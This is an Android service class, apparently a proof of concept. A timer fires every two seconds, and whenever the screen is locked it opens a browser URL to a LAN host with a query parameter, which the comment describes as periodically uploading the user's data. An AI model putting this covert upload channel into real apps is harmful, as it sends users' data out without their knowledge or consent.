public class UploadService extends Service {
	private Timer timer;
	private TimerTask task;
	private KeyguardManager km;

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		km = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);

		// 定期的上传用户的数据.
		timer = new Timer();
		final Random random = new Random();
		task = new TimerTask() {
			@Override
			public void run() {

				if (km.inKeyguardRestrictedInputMode()) {//锁屏状态下
					Intent intent = new Intent();
					intent.setAction(Intent.ACTION_VIEW);
					intent.addCategory(Intent.CATEGORY_BROWSABLE);
					intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					intent.setData(Uri
							.parse("http://192.168.1.2:8080/web/aaa?info="
									+ random.nextInt()));
					startActivity(intent);
				}
			}
		};

		timer.schedule(task, 1000, 2000);
		super.onCreate();
	}

}